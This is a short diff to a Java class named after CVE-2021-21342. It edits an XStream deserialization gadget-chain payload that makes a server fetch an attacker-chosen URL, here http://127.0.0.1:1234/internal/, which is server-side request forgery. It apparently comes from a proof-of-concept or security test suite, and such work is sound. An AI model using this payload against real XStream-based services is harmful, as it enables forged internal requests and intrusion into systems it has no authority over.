@@ -14,10 +14,10 @@ public class CVE_2021_21342 {
                 "      <size>2</size>\n" +
                 "      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n" +
                 "        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n" +
-                "          <packet class='com.sun.xml.internal.ws.api.message.Packet'>\n" +
+                "          <packet>\n" +
                 "            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n" +
                 "              <dataSource class='javax.activation.URLDataSource'>\n" +
-                "                <url>http://127.0.0.1:81/</url>\n" +
+                "                <url>http://127.0.0.1:1234/internal/</url>\n" +
                 "              </dataSource>\n" +
                 "            </message>\n" +
                 "          </packet>\n" +
